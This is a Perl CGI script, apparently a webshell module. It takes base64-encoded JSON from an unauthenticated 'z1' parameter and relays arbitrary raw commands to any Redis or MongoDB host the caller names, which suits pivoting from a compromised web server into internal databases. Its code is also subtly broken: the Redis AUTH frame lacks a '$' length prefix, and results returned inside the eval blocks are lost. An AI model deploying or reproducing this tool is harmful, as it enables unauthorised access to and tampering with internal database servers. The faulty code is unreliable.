#!/usr/bin/perl
use strict;
use warnings;
use CGI;
use MIME::Base64;
use JSON;
use IO::Socket::INET;

my $q = CGI->new;

sub handle_redis {
    my ($ip, $port, $pass, $action, $query, $timeout) = @_;
    eval {
        my $socket = IO::Socket::INET->new(
            PeerAddr => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => $timeout
        );
        return '[-] Redis connection failed.' unless $socket;

        $socket->autoflush(1);

        if (defined $pass && $pass ne "") {
            my $auth_cmd = "*2\r\n\$4\r\nAUTH\r\n" . length($pass) . "\r\n" . $pass . "\r\n";
            print $socket $auth_cmd;

            my $auth_resp = <$socket>;
            if (!defined $auth_resp || index($auth_resp, '-ERR') != -1) {
                close($socket);
                return '[-] Redis Auth Failed: ' . ($auth_resp ? $auth_resp : '');
            }
        }

        if (lc($action) eq 'connect') {
            close($socket);
            return '[+] SUCCESS_REDIS_CONNECTED -> Ready to send RESP commands.';
        }

        $query = 'INFO' if !defined $query || $query eq '';

        my @parts = split(/\s+/, $query);
        my $resp_builder = '*' . scalar(@parts) . "\r\n";
        foreach my $part (@parts) {
            $resp_builder .= '$' . length($part) . "\r\n" . $part . "\r\n";
        }

        print $socket $resp_builder;

        my $response = '';
        while (my $chunk = <$socket>) {
            $response .= $chunk;
            last;
        }

        close($socket);
        return $response;
    };
    if ($@) {
        return '[-] Redis error: ' . $@;
    }
}

sub handle_mongodb {
    my ($ip, $port, $user, $pass, $action, $query, $timeout) = @_;
    eval {
        my $socket = IO::Socket::INET->new(
            PeerAddr => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => $timeout
        );
        return '[-] MongoDB connection error: Could not connect' unless $socket;
        $socket->autoflush(1);

        if (lc($action) eq 'connect') {
            my $ping_command = build_mongo_command('admin', 'isMaster', 1);
            print $socket $ping_command;

            my $buffer;
            read($socket, $buffer, 4096);
            close($socket);

            return '[-] MongoDB connection failed: Response is empty.' unless defined $buffer && length($buffer) > 0;
            return '[+] SUCCESS_MONGO_CONNECTED -> Successfully connected to MongoDB server.';
        }

        $query = 'db.stats()' if !defined $query || $query eq '';

        my $db_name = (!defined $user || $user eq '') ? 'admin' : $user;
        my $cmd_bytes = build_mongo_command($db_name, 'ping', 1);

        if (index($query, 'stats') != -1) {
            $cmd_bytes = build_mongo_command($db_name, 'dbStats', 1);
        } elsif (index($query, 'listCollections') != -1) {
            $cmd_bytes = build_mongo_command($db_name, 'listCollections', 1);
        }

        print $socket $cmd_bytes;

        my $resp_buffer;
        read($socket, $resp_buffer, 8192);
        close($socket);

        return "[+] MongoDB command executed successfully:\n" . extract_mongo_text($resp_buffer);
    };
    if ($@) {
        return '[-] MongoDB connection/query error: ' . $@;
    }
}

sub build_mongo_command {
    my ($db_name, $command_name, $command_value) = @_;
    my $bson = pack('V', 0);
    $bson .= chr(0x10);
    $bson .= $command_name . "\0";
    $bson .= pack('V', $command_value);
    $bson .= chr(0);

    $bson = pack('V', length($bson)) . substr($bson, 4);

    my $msg = pack('V', 0);
    $msg .= pack('V', 12345);
    $msg .= pack('V', 0);
    $msg .= pack('V', 2013);
    $msg .= pack('V', 0);
    $msg .= $db_name . '.$cmd' . "\0";
    $msg .= pack('V', 0);
    $msg .= pack('V', 1);
    $msg .= $bson;

    $msg = pack('V', length($msg)) . substr($msg, 4);
    return $msg;
}

sub extract_mongo_text {
    my ($buffer) = @_;
    return '[Empty BSON binary response received]' unless defined $buffer;
    my $sb = '';
    my @chars = split //, $buffer;
    foreach my $c (@chars) {
        my $ascii = ord($c);
        if ($ascii >= 32 && $ascii <= 126) {
            $sb .= $c;
        } elsif ($c eq "\n" || $c eq "\r" || $c eq "\t") {
            $sb .= $c;
        }
    }
    return length($sb) == 0 ? '[Empty BSON binary response received]' : $sb;
}

sub main {
    my $z1 = $q->param('z1') || '';
    return '[-] Missing parameter z1.' if $z1 eq '';

    my $decoded = eval { decode_base64($z1) };
    my $json_str = ($@ || !defined $decoded || $decoded eq '') ? $z1 : $decoded;

    my $config = eval { decode_json($json_str) };
    return '[-] Invalid JSON / Base64.' if $@ || ref($config) ne 'HASH';

    my $db_type = lc($config->{dbtype} || 'redis');
    my $ip      = $config->{ip} || '127.0.0.1';
    my $port    = (defined $config->{port} && int($config->{port}) > 0) 
                  ? int($config->{port}) 
                  : ($db_type eq 'mongodb' ? 27017 : 6379);

    my $user    = $config->{user} || '';
    my $pass    = $config->{pass} || '';
    my $action  = lc($config->{action} || 'connect');
    my $query   = $config->{query} || '';
    my $timeout = (defined $config->{timeout} && int($config->{timeout}) > 0) 
                  ? int($config->{timeout}) 
                  : 10;

    if ($db_type eq 'redis') {
        return handle_redis($ip, $port, $pass, $action, $query, $timeout);
    } elsif ($db_type eq 'mongodb') {
        return handle_mongodb($ip, $port, $user, $pass, $action, $query, $timeout);
    } else {
        return '[-] Unknown database type: ' . $db_type;
    }
}

print main();